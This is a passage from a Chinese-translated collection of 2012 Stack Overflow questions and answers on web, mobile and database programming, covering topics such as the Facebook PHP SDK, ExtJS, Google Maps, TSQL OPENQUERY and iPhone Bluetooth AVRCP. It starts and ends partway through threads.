> 赞同：1
> 
> 时间：2012-07-03T11:28:09.293

就那么简单：

```
if(mIcon==null){
// set fallback Image or retry
 } 
```

# facebook - 带有 PHP SDK 的 facebook 应用程序无法在 IE 8 中获取用户 ID

> ID：11309893
> 
> 赞同：1
> 
> 时间：2012-07-03T11:24:34.627
> 
> 标签：facebook, internet-explorer-8, facebook-php-sdk

在我的 facebook 应用程序中，我将表单提交到同一页面。
提交后，我会通过getUser()检查用户是否登录。如果可以获取用户 ID，则 POST 数据将存储到数据库中。
以下代码适用于 Mac 和 PC 的 Chrome、Firefox、Safari。
但是，当我第一次在 IE 8 中提交表单时，getUser() 会返回 0。然后我再次提交表单，可以获取用户 ID。
我不知道为什么在第一次提交时无法获得用户 ID。任何人都可以帮忙吗？
谢谢！

```
<?php
$facebook = new Facebook(array(
  'appId'  => FACEBOOK_APP_ID,
  'secret' => FACEBOOK_SECRET_KEY,
));

// Get User ID
$user = $facebook->getUser();
?>

<form action="" method="post" id="form1" name="form1">
...
</form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-08T07:35:26.627

我没有看到其余的代码，但如果你问你是否有 $user，或者你必须请求认证或登录。有这样的事情：

```
if(!$user) make the login request
else continuos with your code. 
```

在 Facebook 开发者端看到 Facebook 的 sdk php 代码或 javascript 库。

其他问题可能是您在尝试获取用户时遇到的错误，并且您可能必须执行

```
try{
    $user = $facebook->getUser();
}catch (exception *e){
//is there is and error you have to login again to get the users data
} 
```

我希望这对你有用

# jquery-ui - jQuery 弹出窗口中没有显示按钮

> ID：11309894
> 
> 赞同：0
> 
> 时间：2012-07-03T11:24:35.110
> 
> 标签：jquery-ui

我正在使用一个对话框和一个日期选择器，但由于某种原因，右上角没有显示关闭按钮，并且您在日期选择器中看不到箭头按钮。这些按钮在那里，因为当您将鼠标悬停在它们上时会显示边框，但您在其他任何时间都看不到它们。有人知道为什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:49:18.593

边框显示意味着您已正确加载 css。但是缺少按钮，因为缺少按钮条图像。

检查您的 css 是否正确给出了图像条路径。它必须相对于 css 文件。

您可以使用 Firefox 中的 Firebug 或 chrome 中的 Inspect Element 进行更多调试。

# html - 在不影响表格单元格的文本对齐的情况下，使用 CSS 制作箭头的永久位置

> ID：11309901
> 
> 赞同：0
> 
> 时间：2012-07-03T11:24:58.747
> 
> 标签：html, css

我有一个 HTML 表格，例如：

```
<div>
    <table border="1">
        <thead>
            <tr class="example">
                <th>
                    <span id="item1">
                      <span>Value1</span>
                      <span class="sort-up no-display">&nbsp;</span>
                    </span>
                </th>
                <th>
                    <span id="item2">
                       <span>Value2</span>
                       <span class="sort-up no-display">&nbsp;</span>
                    </span>
                </th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td>Example 1</td>
                <td>Example 2</td>
            </tr>
            <tr>
                <td>Example 3</td>
                <td>Example 4</td>
            </tr>
        </tbody>
   </table>
</div> 
```

在标题中，我有一个隐藏的向上箭头，当使用 jquery 鼠标悬停/鼠标移出时出现

```
<script type="text/javascript">
      $(function(){
            $(".example th").on("mouseover mouseout", function(){
               var $sort_up = $(this).children().find("span").first().next();

                $sort_up.toggleClass("no-display");
            });
      });

</script> 
```

CSS`no-display`在哪里。`display:none`

截图（之前）

![在此处输入图像描述](../Images/f7aed1cb1e50272919059a79574db2bf.png)

之后：

![在此处输入图像描述](../Images/be5b8f10a1a2db6d6006eef9f2462e27.png)

我希望该标题标题不会在 mouseover/mouseout 事件中移动。

怎么做 ？也许是一个 CSS 技巧。

PS：也许像：

![在此处输入图像描述](../Images/992b07dbd1f355f4ce5346f1c6d80d07.png)

感谢您对我的耐心，因为我对 CSS 没有更多的了解。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:35:23.967

我不完全确定您为什么要使用图像来创建箭头，这会导致对齐问题；如果您使用`text()`创建文本箭头，臭名昭著的 unicode 向上指向三角形，那么对齐将保持自身：

```
$('.example th').on('mouseover mouseout',
                     function(e){
                         var evt = e.type,
                             sort = $(this).find('span:last');
                         if (evt == 'mouseover'){
                             sort.text('▲');
                         }
                         else if (evt == 'mouseout') {
                             sort.text('');
                         }
                     });​ 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/MTQ4X/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:27:14.467

进行这些更改

```
<span id="Val">Value2</span>
#Val{position:absolute;} Add top and left as per your need. 
```

现在，即使您的箭头出现，它也会保持固定。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-03T11:31:16.433

使用 CSS 属性将其从[html 流](https://stackoverflow.com/questions/3293340/what-is-the-means-of-terms-normal-flow-and-out-of-flow-in-terms-of-html-cs)中取出；要么[`position: absolute`](https://developer.mozilla.org/en/CSS/position)要么[`float: right`](https://developer.mozilla.org/en/CSS/float)。

# iphone - ASIHTTPRequest 完成块 + ARC

> ID：11309903
> 
> 赞同：1
> 
> 时间：2012-07-03T11:25:24.893
> 
> 标签：iphone, objective-c, ios, asihttprequest, block

我有以下代码来下载图像：

```
 imageRequest = [ASIHTTPRequest requestWithURL:[NSURL URLWithString:magazineItem.contentURL]];
  __weak ASIHTTPRequest *weakRequest = imageRequest;

  __block typeof (self) bself = self;
  [imageRequest setCompletionBlock:^{
    if (weakRequest.responseStatusCode == 200) {
      bself.imageData = weakRequest.responseData;
      [[DataAccessLayer sharedInstance] storeTemporaryContentData:bself.imageData url:magazineItem.contentURL];
      bself.contentImage = [UIImage imageWithData:bself.imageData];
      if (bself.contentImage != nil) {
        if (bself.magazineItem.presentationStyle.intValue != -1) {
          [bself setPresentationStyle:bself.magazineItem.presentationStyle.intValue];
        }
        else {
          [bself setPresentationStyleForImage:bself.contentImage];
        }
      }
      else
        [bself.delegate contentItemViewUnavailable:bself];
    }
    else {
      [bself.delegate contentItemViewUnavailable:bself];
    }
  }];

  [imageRequest setFailedBlock:^{
    if (weakRequest.error.code == 4)
      return;
    [bself.delegate contentItemViewUnavailable:bself];
  }];

  [imageRequest startAsynchronous]; 
```

尽管我使用`__block typeof (self)`标识符将 self 传递到块中，但它仍然被保留。我也尝试过`__weak MyClassName *bself = self;`，它仍然进入保留周期。看来我在这里遗漏了一些东西，谁能告诉我我到底做错了什么？

供参考`imageRequest`的是我的 .m 文件类别中的 __strong iVar。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:33:07.540

尝试

```
__block __unsafe_unretained typeof (self) bself = self; 
```

- 编辑 -

实际解决问题的评论

访问 ivars 时，请使用 bself.property。如果您直接访问您的 ivars，它将获得一个保留周期。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:36:28.353

正如这里所建议的，[用于弱自我引用的通用 typeof](https://stackoverflow.com/questions/10892361/generic-typeof-for-weak-self-references/10892406#1089)

```
__weak __typeof__((__typeof__(self))self) bself = self 
```

# php - 压缩来自 zend 框架 2 的 html 输出

> ID：11309904
> 
> 赞同：3
> 
> 时间：2012-07-03T11:25:25.000
> 
> 标签：php, zend-framework2, output-buffering, html-manipulation

我目前在 PHP 5.4.4 上使用 Zend Framework 2 beta 来开发个人 web 应用程序以用于自学目的。

我想知道是否可以在将 html 输出发送到浏览器之前拦截它，以便通过删除所有不必要的空格来缩小它。

我怎样才能在 ZF2 中实现这个结果？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-03T19:23:53.803

是的，您可以：

在 Modle.php 上创建一个将在完成时触发的事件

```
public function onBootstrap(Event $e)
{
    $app = $e->getTarget();
    $app->getEventManager()->attach('finish', array($this, 'doSomething'), 100);
}

public function doSomething ($e)
{
    $response = $e->getResponse();
    $content = $response->getBody();
    // do stuff here
    $response->setContent($content);

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-11-14T20:07:03.980

只需将这两个方法放在任何 module.php 中即可。它将 gzip 并将压缩后的内容发送到浏览器。

```
 public function onBootstrap(MvcEvent $e)
{
    $eventManager = $e->getApplication()->getEventManager();
    $eventManager->attach("finish", array($this, "compressOutput"), 100);
}

public function compressOutput($e)
    {
        $response = $e->getResponse();
        $content = $response->getBody();
        $content = preg_replace(array('/\>[^\S ]+/s', '/[^\S ]+\</s', '/(\s)+/s', '#(?://)?<![CDATA[(.*?)(?://)?]]>#s'), array('>', '<', '\\1', "//&lt;![CDATA[n" . '1' . "n//]]>"), $content);

        if (@strpos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip') !== false) {
            header('Content-Encoding: gzip');
            $content = gzencode($content, 9);
        }

        $response->setContent($content);
    } 
```

# mysql - 新鲜的 MySQL Workbench 安装在 Mac OSX Lion 上没有响应

> ID：11309908
> 
> 赞同：1
> 
> 时间：2012-07-03T11:25:39.897
> 
> 标签：mysql, macos, installation, osx-lion, mysql-workbench

我有一台安装了 Lion (10.7.4) 和 MySQL (5.5.24) 的全新 Macbook Pro。CLI 工作正常，但是当我安装 MySQL Workbench (5.2.40) 时，UI 没有响应。

我能得到的唯一响应是管理连接将突出显示并允许我在鼠标位于正确位置上方约一英寸时选择它。

我可以正常创建新连接并连接到数据库，但无法关闭选项卡。

此行为不适用于“数据建模”或“服务器管理”部分。

我对 Linux 上的 MySQL Workbench 非常熟悉，但是这个 Mac 问题让我很困惑。

任何帮助是极大的赞赏。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-30T01:33:51.323

我遇到了同样的问题，正在谷歌搜索解决方案 - 结果找到了你的帖子。同时，自己得到了解决方案。转到 /Applications 并打开 MySQLWorkbench.app 的信息并检查“以低分辨率打开”。它对我有用（新的 Macbook Pro/Retina@1920x1200）。

# javascript - ExtJS 窗口 setActive() 没有按预期工作

> ID：11309910
> 
> 赞同：1
> 
> 时间：2012-07-03T11:25:44.130
> 
> 标签：javascript, extjs, extjs4, extjs4.1

**TL/DR：**

调用`window.setActive(false)`不会将窗口的`active`属性设置为`false`。

**完整详情：**

我有以下 ExtJS 类继承自`Ext.window.Window`：

```
Ext.define('WD.view.TbWindow', {
    extend : 'Ext.window.Window',
    isTbWindow: true,

    title: 'Set Me!!',
    constrain: true, // constrain window to viewport
    autoShow: false,
    maximizable: true,
    minimizable: true,

    renderTo: 'main_panel-body',

    minimize: function() {
        this.hide();
        this.setActive(false);
        this.animateTarget.handleWinMinimize();
    },

    ...

}); 
```

在`minimize`上面的函数中有调用`this.setActive(false);`

我使用 Chrome 开发者工具来调试代码。在执行该行之前`this.active`是`true`. 行执行后它仍然是`true`. 我正在使用 ExtJS 4.1。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-06T11:34:50.740

源代码中没有设置 true 或 false 的 active 属性，文档中也没有提到它。

```
setActive: function(active, newActive) {
    var me = this;

    if (active) {
        if (me.el.shadow && !me.maximized) {
            me.el.enableShadow(true);
        }
        if (me.modal && !me.preventFocusOnActivate) {
            me.focus(false, true);
        }
        me.fireEvent('activate', me);
    } else {
        // Only the *Windows* in a zIndex stack share a shadow. All other types of floaters
        // can keep their shadows all the time
        if (me.isWindow && (newActive && newActive.isWindow)) {
            me.el.disableShadow();
        }
        me.fireEvent('deactivate', me);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-01T17:25:20.217

问题出在`Ext.WindowManager.getActive()`方法上。事实上，在 Web 桌面示例中，Sencha 家伙实际上做了一些不太好的编码来获得实际的活动窗口。我复制了该代码，并开始在我的代码中支持 windows 数组，这解决了我的问题。

我编写了一个（并在其中内置了额外的功能）一个`DesktopMgr`小部件，它继承自`Ext.util.MixedCollection`并充当“桌面管理器”，其中“桌面”表示任何用于处理多个窗口、激活、停用、导航到上一个/下一个等

`DesktopMgr`您可以从此[gist](https://gist.github.com/4183342)下载和使用。如果您找到改进它的方法（或要修复的错误！），请告诉我。

# google-maps - 谷歌地图缩放以适 应

> ID：11309914
> 
> 赞同：0
> 
> 时间：2012-07-03T11:25:56.833
> 
> 标签：google-maps, zooming

我开发了一张地图，它使用来自数据库的地理坐标，使用集群标记示例。我试图通过使用使其自动缩放`LatLngBounds();`

```
 <script type="text/javascript">
     function initialize() {
            var center = new google.maps.LatLng(9.4419, 9.1419);

            var map = new google.maps.Map(document.getElementById('map'), {
              zoom: 2,
              center: center,
              mapTypeId: google.maps.MapTypeId.ROADMAP
            });

            var markers = [];
            // create the infowindow out of the for boucle
            var infoWindow = new google.maps.InfoWindow;
            var bounds = new google.maps.LatLngBounds();

for ( var i = 0; i < latlng.length; i++ ) {

      var latLng = new google.maps.LatLng(latlng.lat,latlng.lng);   

     var html = 'test show in infowondow';

    var marker = new google.maps.Marker({
            position: latLng,
            map: map,
            icon:"/img/icon1.jpg",
            title:"test title",
        });
    // call to the function....
    bindInfoWindow(marker, map, infoWindow, html);
    markers.push(marker);

  }     

            var markerCluster = new MarkerClusterer(map, markers);
          }

    // create a function bindInfoWindow

    function bindInfoWindow(marker, map, infoWindow, html) {
          google.maps.event.addListener(marker, 'click', function() {
            infoWindow.setContent(html);
            infoWindow.open(map, marker);
          });
    }

            var markerCluster = new MarkerClusterer(map, markers);
          }
          google.maps.event.addDomListener(window, 'load', initialize);
        </script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:29:23.167

*   使边界全球化。
*   然后

`var latLng = new google.maps.LatLng(latlng.lat,latlng.lng);` 

编辑：正如马塞洛指出的那样，将其更改为：

`var latLng = new google.maps.LatLng(latlng[i].lat,latlng[i].lng);` 

添加：

`bounds.extend(latLng)`

*   后

`var markerCluster = new MarkerClusterer(map, markers);`

添加：

`map.fitBounds(bounds);`

# javascript - 创建一个 Jquery 更新函数？

> ID：11309918
> 
> 赞同：0
> 
> 时间：2012-07-03T11:26:18.417
> 
> 标签：javascript, jquery

如何在 javascript/jquery 中创建更新函数？

更新函数是在游戏的每一步运行的函数，例如每秒运行 60 次。它在游戏开发中被大量使用。

我怎样才能在 jquery 中做这样的事情？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-03T11:27:25.787

可能你需要使用[`setInterval`](https://developer.mozilla.org/En/Window.setInterval)函数。

但我建议[`requestAnimationFrame`](https://developer.mozilla.org/en/DOM/window.requestAnimationFrame)改用它，因为它是为开发浏览器游戏而设计的，并且可以根据需要每秒执行 60 次调用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-03T11:28:26.130

为什么是 jQuery？只需调用一个频率为`1000/60`毫秒的函数，例如

```
setInterval(function() {
  ...
}, 1000/60) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T11:29:30.007

这将部分取决于您的渲染方法。如果您将在（例如）一个`<canvas>`元素中渲染您的“游戏”，您可能需要使用[requestAnimationFrame](https://developer.mozilla.org/en/DOM/window.requestAnimationFrame)（一个 javascript 原生函数）

有关更多信息，请参阅[这篇有用的文章](http://athousandnodes.com/article/using-requestanimationframe-web-browser-animations-instead-settimeout)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-03T11:29:32.627

在这种情况下，SetInterval 将对您有用。

你可以像这样使用它 -

```
var timer = setInterval(callback,delay); 
```

此代码将执行一个名为`callback`每`delay`毫秒的函数。

要停止计时器，您可以使用该`clearInterval()`方法。

```
clearInterval(timer); 
```

正如我所说，间隔以**毫秒为单位**定义，因此为了让您的回调每秒执行 60 次，您需要传递 16 或 17 毫秒作为`delay`参数。

# tsql - TSQL 使用参数更新 openquery

> ID：11309926
> 
> 赞同：0
> 
> 时间：2012-07-03T11:27:02.637
> 
> 标签：tsql

我已经成功地不使用类似下面的东西进行查询，但我无法使用“变量”进行更新，而没有它们我可以。这可能吗？这抱怨

> '附近的语法不正确' set stuf_rec.stat = "A"

```
DECLARE @stuf_no varchar(6)
set @stuf_no = 267
DECLARE @sql varchar (2000) 
set @sql = 
'UPDATE OPENQUERY(train,''select stat from stuf_rec 
where stuf_no =  '+ @stuf_no + ''')'' set stuf_rec.stat = ' + '"A"' + ' 
where stuf_rec.stuf_no = ' + @stuf_no + ''';' 
```

谢谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:33:16.230

这对你有用吗？还是该值必须带有双引号？

```
DECLARE @stuf_no varchar(6)
set @stuf_no = '267'
DECLARE @sql varchar (2000)

set @sql =    
'UPDATE OPENQUERY(train,''select stat from stuf_rec    
where stuf_no =  '+ @stuf_no + ''') set stuf_rec.stat = ''A''     
where stuf_rec.stuf_no = ' + @stuf_no + ';' 
```

@sql 的结果如下所示：

```
UPDATE OPENQUERY(train,'select stat from stuf_rec      
                        where stuf_no =  267') 
    set stuf_rec.stat = 'A'       
    where stuf_rec.stuf_no = 267; 
```

# c# - 如何获取选定列表框项的属性值

> ID：11309927
> 
> 赞同：0
> 
> 时间：2012-07-03T11:27:03.963
> 
> 标签：c#, windows-phone-7, xaml, windows-phone-7.1

我要做的是，获取列表框中所选项目的属性值。

```
private void PhoneApplicationPage_Loaded(object sender, RoutedEventArgs e)
{
    //listBox1.Items.Clear();

    IList<FoodViewModel> food = this.Getfoodlist();    
    List<Foodlist> foodItems = new List<Foodlist>();

    foreach (FoodViewModel foodlist in food)
    {
        int foodID = foodlist.C_ID;
        string foodDetail = foodlist.FoodDetail;
        string foodTime = foodlist.FoodTime;
        string foodDate = foodlist.DateofFood;

        foodItems.Add(new Foodlist() { C_ID = foodID, FoodTime = foodTime, DateofFood = foodDate, FoodDetail = foodDetail}); 
    }

    listBox1.ItemsSource = foodItems;
}

public class Foodlist
{
    public int C_ID { get; set; }
    public string DateofFood{ get; set;}    
    public string FoodTime{ get; set;}    
    public string FoodDetail{ get; set;}
} 
```

XAML 代码-

```
<ListBox Height="528" HorizontalAlignment="Left" Margin="1,4,0,0" Name="listBox1" VerticalAlignment="Top" Width="453">
    <ListBox.ItemTemplate>
        <DataTemplate>
            <StackPanel>
                <TextBlock Name="foodDetail"
                           Text="{Binding FoodDetail}" />
                <TextBlock Name="date"
                           Text="{Binding DateofFood}" />
                <TextBlock Name="time"
                           Text="{Binding FoodTime}" />
                <TextBlock Name="ID"
                           Text="{Binding C_ID}" Visibility="Collapsed" />
            </StackPanel>
        </DataTemplate>
    </ListBox.ItemTemplate>
</ListBox> 
```

现在，我想要得到的是选定列表框项的 C_ID(value)。有什么建议么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:44:38.493

它会是这样的：

```
private void listBox1_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
{
    if (e.AddedItems.Count > 0)
    {
        var c_id = (e.AddedItems[0] as Foodlist).C_ID;
    }
} 
```

和

```
Page_Ctor --> listBox1.SelectionChanged += listBox1_SelectionChanged; 
```

干杯，

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T12:36:45.007

> 我在哪里放置这个“Page_Ctor --> listBox1.SelectionChanged += listBox1_SelectionChanged;”

这里 ：

```
<ListBox .... SelectionChanged="listBox1_SelectionChanged"> 
```

# database - 将几个 sqlite 数据库（每个文件一个表）组合成一个大型 sqlite 数据库

> ID：11309930
> 
> 赞同：0
> 
> 时间：2012-07-03T11:27:11.193
> 
> 标签：database, sqlite

如何将几个 sqlite 数据库（每个文件一个表）组合成一个包含所有表的大型 sqlite 数据库。例如，您有数据库文件：db1.dat、db2.dat、db3.dat....并且您想创建一个文件 dbNew.dat，其中包含来自所有 db1、db2...的表

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-07-03T11:27:11.630

在各种论坛上提出了几个类似的问题。我出于特定原因发布了这个问题（带有答案）。当您处理多个表并在那里索引了许多字段时。在目标数据库表中正确创建索引会导致不必要的混乱。您可能会错过 1-2 索引，这很**烦人**。给定的方法还可以处理大量数据，即当您确实拥有 gbs 表时。以下是执行此操作的步骤：

1.  下载sqlite专家：[http ://www.sqliteexpert.com/download.html](http://www.sqliteexpert.com/download.html)
2.  新建数据库dbNew：文件->新建数据库
3.  加载第一个 sqlite 数据库 db1（包含单个表）：文件-> 打开数据库
4.  单击“ **DDL** ”选项。它为您提供了创建特定 sqlite 表 CONTENT 所需的命令列表。
5.  复制这些命令并选择“SQL”选项。将命令粘贴到那里。将目标表 DEST 的名称（从默认名称 CONTENT）更改为您想要的任何名称。6'点击'执行SQL'。这应该会为您提供 db1 中名为 DEST 的表 CONTENT 的副本。这样做的主要用途是在 DEST 表中创建所有索引，就像它们在 CONTENT 表中一样。
6.  现在只需单击并将 DEST 表从数据库 db1 拖动到数据库 dbNew。
7.  现在只需删除数据库 db1。
8.  返回到第 3 步并重复另一个数据库 db2 等。

# php - php邮件功能有多个收件人的问题？

> ID：11309933
> 
> 赞同：1
> 
> 时间：2012-07-03T11:27:15.893
> 
> 标签：php

如果所有地址都有效，PHP 邮件功能可以正常工作并向每个地址发送邮件，但如果任何电子邮件 ID 无效（我的意思是不存在）邮件功能不起作用。有没有人遇到过类似的问题，是否有相同的解决方案，或者我应该尝试自己验证所有电子邮件 ID 的存在。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:30:20.413

只需循环所有地址 - 然后应该独立工作。（除了您需要向所有人展示所有收件人）

```
 foreach ($emails as $email){
      //do mail stuff.
    } 
```

您还可以添加一些错误处理来收集无效地址。

# extjs - 在 extjs 网格中拖放的行顺序

> ID：11309934
> 
> 赞同：1
> 
> 时间：2012-07-03T11:27:22.477
> 
> 标签：extjs, drag-and-drop, grid

我在这样的网格中使用拖放功能：

```
{
xtype: 'gridpanel',
id: 'editlinesGrid',
title: 'line',
forceFit: true,
store: 'gridEditlines',
region: 'center',
viewConfig: {
    plugins: [
    Ext.create('Ext.grid.plugin.DragDrop', {
        ptype: 'gridviewdragdrop'
    })],
    listeners: {
        drop: {
            fn: me.onGriddragdroppluginDrop,
            scope: me
        }
    }
},
columns: [{
    xtype: 'rownumberer',
    dataIndex: 'stopOrder'
}, {
    xtype: 'gridcolumn',
    dataIndex: 'stopId',
    text: 'stopId',
    field: {
        xtype: 'combobox',
        allowBlank: false,
        displayField: 'stopId',
        store: 'gridStops'
    }
}, 
```

当我将行拖动到更高或更低的位置时，我需要将新位置发送到服务。我需要发送的是：

```
{
"stopOrder": 1,  <-- here should be the new position in the grid
"stopDTO": {
"stopId" : 1
}
} 
```

这是我用于拖放的事件绑定

```
 onGriddragdroppluginDrop: function(node, data, overModel, dropPosition, options) {
    alert(data);
}, 
```

我需要做什么才能将数据发送回服务？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-11-06T13:41:40.357

至于没有回答的问题，我也花了一些时间来“找到”它，这是到主要 sencha doc[使用 DnD 重新排序网格行的链接](http://docs.sencha.com/extjs/4.2.2/#!/api/Ext.grid.plugin.DragDrop)

# ajax - 如何在 Wordpress 中使用 XMLHttpRequest？

> ID：11309939
> 
> 赞同：0
> 
> 时间：2012-07-03T11:27:39.840
> 
> 标签：ajax, wordpress, url, xmlhttprequest

我正在尝试使用`XMLHttpRequest`.

我在本地的非 Wordpress 文件上对其进行了测试，并且可以正常工作。但是在生产中，在我的 Wordpress 文件中，`onreadystatechange AJAX status`没有`200`.

在 Wordpress 中进行 XMLHttpRequesting 时有什么需要注意的吗？

```
<script>
params = "parameter=" + value;
request.open("POST", "../myfile.php", true);
request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
request.setRequestHeader("Content-length", params.length);
request.setRequestHeader("Connection", "close");
request.onreadystatechange = function()
{
    if (this.readyState == 4)
    {
        if (this.status == 200)
        {
            if (this.responseText != null)
            {
                console.log('Request completed');
            }
            else console.log("Ajax error: No data received")
        }
        else console.log("Ajax error: " + request.statusText );
    }
};
request.send( params );

// 'request' is 'XMLHttpRequest()' or 'ActiveXObject("Microsoft.XMLHTTP")'
// depending on browser
</script> 
```

为了创建代码，我遵循[了我的 O'Reilly 书的第二个示例](http://lpmj.net/1stedition/18.php)。

任何建议将不胜感激！谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T19:52:05.480

最终，这个脚本没有任何问题。

我认为这是由于我使用的工作框架（ Wordpress 的[Roots](http://www.rootstheme.com/)主题）。我将其更改为[Handcrafted](http://randyjensenonline.com/thoughts/handcrafted-wp-starter-theme/)并解决了问题。

# gcc - cegcc：链接使用 vc++ 编译的导入库失败（重整问题）

> ID：11309941
> 
> 赞同：0
> 
> 时间：2012-07-03T11:27:42.317
> 
> 标签：gcc, windows-mobile, undefined-reference

我有适用于 Windows Mobile 6 的应用程序。要构建它，我使用 cegcc (arm-mingw32ce)。现在我有了带有新 SDK 的新设备，并且必须将这个 SDK 中的一些功能添加到这个应用程序中。SDK来了。

头文件.h

```
#ifndef _HEADER_H_
#define _HEADER_H_

#include <windows.h>

#ifndef _SOME_FLAG_
extern "C"
{
#endif

BOOL foo(DWORD *lpdwParam1, DWORD *lpdwParam2);

#ifndef _SOME_FLAG_
}
#endif

#endif 
```

library.lib（这*可能是*用 VC++ 编译的导入库，设备上有 library.dll）

“dumpbin /all library.lib”的一些输出

```
2DA0 ?foo@@YAHPAK0@Z
2DA0 __imp_?foo@@YAHPAK0@Z

Archive member name at 2DA0: library.dll/
correct header end
Version      : 0
Machine      : 1C2 (Thumb)
SizeOfData   : 0000002B
DLL name     : library.dll
Symbol name  : ?foo@@YAHPAK0@Z (int __cdecl foo(unsigned long *,unsigned long *))
Type         : code
Name type    : undecorate
Hint         : 14
Name         : foo 
```

我可以在 VS2k5 中使用这个 SDK（需要安装 Windows Mobile SDK...），但是用 cegcc 编译失败。

我试图将它编译并链接为 C 和 Cpp。有和没有 _SOME_FLAG_ 定义（带有此标志集的 C 编译当然在*extern "C"*上失败）。

结果是：

```
undefined reference to `foo' 
```

当 C 编译或使用*extern "C"*编译的 Cpp和

```
undefined reference to `foo(unsigned long*, unsigned long*)' 
```

当 Cpp 编译时没有*extern "C"*。

编译：

```
gcc -O2 -Wall -Wextra -pedantic -Wno-long-long -g -c -DUNICODE -D_UNICODE -Ic:\inc sample.c 
```

链接：

```
gcc -static -mconsole -o sample obj\sample.o -lc:\lib\library.lib -laygshell 
```

当我 Cpp 编译时，我只是将 sample.c 更改为 sample.cpp（只有 main 和简单的 foo 调用）。

看起来有一个重整问题（vc++ vs gcc）。我试图添加`__attribute__((dllimport))` 和`__attribute__((cdecl))`

我怎么解决这个问题？有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T09:41:18.997

问题解决了。我忘记了运行时动态链接的可能性

```
#include <windows.h>
#include <winbase.h>
#include <header.h>

HINSTANCE dllinst = NULL;
typedef BOOL (CALLBACK LP_FOO)(DWORD *lpdwParam1, DWORD *lpdwParam2);
static LP_FOO Foo;

dllinst = LoadLibrary("library.dll");
Foo = (LP_FOO) GetProcAddress((HMODULE) dllinst, "foo"); 
```

现在我可以像 foo 一样使用 Foo。

# iphone - 用 iPhone 控制蓝牙音频设备

> ID：11309950
> 
> 赞同：5
> 
> 时间：2012-07-03T11:28:21.113
> 
> 标签：iphone, objective-c, ios, bluetooth, avrcp

我正在寻找为 iPhone 编写应用程序，它将能够控制汽车中的收音机和 CD 播放器。收音机和播放器有可用的蓝牙连接。

我开始这个问题是为了获得我需要的所有信息。我有几个问题，但如果您发现任何我没有问的对我开始开发此应用程序很重要的事情，请告诉我。

我已经阅读了有关 AVRCP 配置文件和车载蓝牙设备支持 AVRCP 1.3 的信息，这对我来说已经足够好了，考虑到可以在该协议版本中执行的控制。

我读了很多关于人们说“Apple 设备只能相互交互”、“Apple 设备无法通过蓝牙连接到非 Apple 设备”、“如果你想这样做，MFi 程序是强制性的”、“MFi不需要”等。我的第一个问题是：

**1）是否可以通过蓝牙将iPhone（4、4S）与车载收音机和CD播放器配对，并用任何iPhone版本控制电台和音乐？如果是，那么进行这种成功的蓝牙连接有什么限制？**

关于iPhone可以工作的角色的信息也很少。对于 AVRCP，有两种角色：控制器角色和目标角色。通过阅读本文：[https](https://developer.apple.com/hardwaredrivers/BluetoothDesignGuidelines.pdf) ://developer.apple.com/hardwaredrivers/BluetoothDesignGuidelines.pdf我没有找到第二个问题的答案：

**2) iPhone 可以充当控制器并向目标设备（收音机和 CD 播放器）发出 AVRCP 1.3 中规定的所有可用命令吗？**

我也想知道这个特定问题的可用框架。我知道其中有几个，但是如果有人认出适合我的问题的那个，我想知道：

**3) 我应该使用哪个框架与目标设备交互？**

从开发人员的角度来看，我也对与连接的蓝牙设备交互的可用 API 感兴趣。由于我正在制作自己的应用程序并将操作分配给按钮，因此在分配给按钮的方法中，我需要执行向目标设备发送消息。所以我的下一个问题是：

**4）有谁知道是否有办法将命令发送到目标设备（启动/停止/暂停/前进/后退等）作为 XCode 中提供的某些 API 的一部分，或者我参加通过蓝牙发送到目标的每条消息我需要根据协议文档制作的设备（自己制作整个消息（标题、正文、命令部分等））？**

AVRCP 是我完成这个应用程序的想法。如果我错了，请告诉我。蓝牙具有不同的配置文件，据我了解，当从一台设备发送消息时，配置文件本身会处理消息并对其进行解释并将其传递给目标设备，以便目标设备可以理解它。从我从我的 Objective-C（或 C）代码发送消息的那一刻起，我不明白如何处理从 iPhone 发送到目标蓝牙设备的消息。这是我的主要疑问，它与问题 4 相关 -***我是否需要以正确的格式制作原始消息以便将 AVRCP 命令发送到设备，或者我可以使用一些 API 将这些消息识别为 AVRCP（或任何其他类型) 并将其传送到目标设备***？

从开发人员的角度来看，最后一个问题（如果我认为对之前的所有问题都有任何积极的回答）最让我担心。因此，如果有人可能对这个特定问题有经验，我将不胜感激任何形式的回答或建议。

我真的很期待你的回答。我希望围绕这个话题展开建设性和有用的讨论，并写出很多有用的信息。

最好的祝福。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-03T11:36:31.677

如果您的设备（CD 播放器）符合蓝牙 4.0 LE 标准，您可以使用 CoreBluetooth

* * *

## 回答 #2

